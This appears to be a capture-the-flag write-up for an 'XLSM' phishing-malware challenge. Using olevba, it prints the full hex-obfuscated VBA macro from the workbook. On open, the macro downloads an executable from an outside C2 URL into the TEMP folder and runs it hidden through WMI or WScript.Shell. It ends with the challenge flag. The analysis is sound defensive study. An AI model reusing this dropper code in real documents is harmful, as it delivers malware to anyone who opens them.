# XLSM

> **Challenge Description:** We received an email from our accountant. But, she said she didn't send the email to us. Something phishy going on here. Please check the file. What is the filename that will be dropped into the disk?
> 
> **Flag Format:** `ihack{filename.ext}`

### Solution

Extract the VBA macro from the `xlsm` file using `olevba` from `oletools`.

```
â”Œâ”€â”€(kaliðŸ’€JesusCries)-[~/Desktop/iHack/malware]
â””â”€$ olevba datasheet\ 2022.xlsm                   
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.10.5 - http://decalage.info/python/oletools
===============================================================================
FILE: datasheet 2022.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub rzjsijjawdz()
Dim lkwuomnvqx As String
Dim oogwwdbnsrnbxdhsuy As String
Dim nxlilnebcwk As Object, elftgjmrw As Object
Dim ihcnlhmi As Integer
lkwuomnvqx = ircqbvbqtzdtamp("687474") & ircqbvbqtzdtamp("70733a2f2f636e632e696861636b2e636f6d2f6d616c776172652e657865")
oogwwdbnsrnbxdhsuy = ircqbvbqtzdtamp("696834634b72") & ircqbvbqtzdtamp("30636b732e657865")
oogwwdbnsrnbxdhsuy = Environ("TEMP") & "\" & oogwwdbnsrnbxdhsuy
Set nxlilnebcwk = CreateObject(ircqbvbqtzdtamp("4d53584d4c322e5365") & ircqbvbqtzdtamp("72766572584d4c485454502e362e30"))
nxlilnebcwk.setOption(2) = 13056
nxlilnebcwk.Open ircqbvbqtzdtamp("474554"), lkwuomnvqx, False
nxlilnebcwk.setRequestHeader ircqbvbqtzdtamp("557365722d") & ircqbvbqtzdtamp("4167656e74"), ircqbvbqtzdtamp("4d6f7a696c6c612f342e302028636f6d70617469626c653b204d53494520362e303b2057696e64") & ircqbvbqtzdtamp("6f7773204e5420352e3029")
nxlilnebcwk.Send
If nxlilnebcwk.Status = 200 Then
Set elftgjmrw = CreateObject(ircqbvbqtzdtamp("41444f44") & ircqbvbqtzdtamp("422e53747265616d"))
elftgjmrw.Open
elftgjmrw.Type = 1
elftgjmrw.Write nxlilnebcwk.ResponseBody
elftgjmrw.SaveToFile oogwwdbnsrnbxdhsuy, 2
elftgjmrw.Close
ebpwftvjmrrzybklmkt oogwwdbnsrnbxdhsuy
End If
End Sub
Sub Workbook_Open()
rzjsijjawdz
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO eofcpjowm.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/eofcpjowm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ebpwftvjmrrzybklmkt(qozmofh As String)
On Error Resume Next
Err.Clear
wimResult = aljjqlvv(qozmofh)
If Err.Number <> 0 Or wimResult <> 0 Then
Err.Clear
giayqxjvksmnjqcruwg qozmofh
End If
On Error GoTo 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO rydaiftge.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/rydaiftge'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function aljjqlvv(pwomwatusrqddxb As String) As Integer
Dim rqrbtsmgmhsjtxeu As Object
Dim heeudbw As Object
Set pswcklwz = GetObject(ircqbvbqtzdtamp("77696e6d676d74") & ircqbvbqtzdtamp("733a5c5c2e5c726f6f745c63696d7632"))
Set aaleqjnibh = pswcklwz.Get(ircqbvbqtzdtamp("57696e33325f50726f6365") & ircqbvbqtzdtamp("737353746172747570"))
Set rqrbtsmgmhsjtxeu = aaleqjnibh.SpawnInstance_
rqrbtsmgmhsjtxeu.ShowWindow = 0
Set heeudbw = GetObject(ircqbvbqtzdtamp("77696e6d676d74733a5c") & ircqbvbqtzdtamp("5c2e5c726f6f745c63696d76323a57696e33325f50726f63657373"))
aljjqlvv = udoyehhvuiub(heeudbw, rqrbtsmgmhsjtxeu, pwomwatusrqddxb)
End Function
Private Function udoyehhvuiub(rqmhmbjrmuvqmn As Object, eywtconmadxbdvnyc As Object, gtkzhzznawqdi As String) As Integer
Dim gnbkhln As Long
udoyehhvuiub = rqmhmbjrmuvqmn.Create(gtkzhzznawqdi, Null, eywtconmadxbdvnyc, gnbkhln)
End Function

-------------------------------------------------------------------------------
VBA MACRO ugucpfmqg.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ugucpfmqg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub giayqxjvksmnjqcruwg(cmdLine As String)
CreateObject(ircqbvbqtzdtamp("575363726970742e") & ircqbvbqtzdtamp("5368656c6c")).Run cmdLine, 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO vmkftyrtx.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/vmkftyrtx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function ircqbvbqtzdtamp(ByVal ltmnjduwe As String) As String
Dim kizrrscqmo As Long
For kizrrscqmo = 1 To Len(ltmnjduwe) Step 2
ircqbvbqtzdtamp = ircqbvbqtzdtamp & Chr$(Val("&H" & Mid$(ltmnjduwe, kizrrscqmo, 2)))
Next kizrrscqmo
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command (obfuscation: Hex)                   |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |malware.exe         |Executable file name (obfuscation: Hex)      |
|IOC       |0cks.exe            |Executable file name (obfuscation: Hex)      |
|Hex String|ps://cnc.ihack.com/m|70733a2f2f636e632e696861636b2e636f6d2f6d616c7|
|          |alware.exe          |76172652e657865                              |
|Hex String|ih4cKr              |696834634b72                                 |
|Hex String|0cks.exe            |30636b732e657865                             |
|Hex String|MSXML2.Se           |4d53584d4c322e5365                           |
|Hex String|rverXMLHTTP.6.0     |72766572584d4c485454502e362e30               |
|Hex String|User-               |557365722d                                   |
|Hex String|Agent               |4167656e74                                   |
|Hex String|Mozilla/4.0         |4d6f7a696c6c612f342e302028636f6d70617469626c6|
|          |(compatible; MSIE   |53b204d53494520362e303b2057696e64            |
|          |6.0; Wind           |                                             |
|Hex String|ows NT 5.0)         |6f7773204e5420352e3029                       |
|Hex String|ADOD                |41444f44                                     |
|Hex String|B.Stream            |422e53747265616d                             |
|Hex String|winmgmt             |77696e6d676d74                               |
|Hex String|s:\\.\root\cimv2    |733a5c5c2e5c726f6f745c63696d7632             |
|Hex String|Win32_Proce         |57696e33325f50726f6365                       |
|Hex String|ssStartup           |737353746172747570                           |
|Hex String|winmgmts:\          |77696e6d676d74733a5c                         |
|Hex String|\.\root\cimv2:Win32_|5c2e5c726f6f745c63696d76323a57696e33325f50726|
|          |Process             |f63657373                                    |
|Hex String|WScript.            |575363726970742e                             |
|Hex String|Shell               |5368656c6c                                   |
+----------+--------------------+---------------------------------------------+
```

Concatenate the hex strings together to form the flag.

**Flag:** `ihack{ih4cKr0cks.exe}`
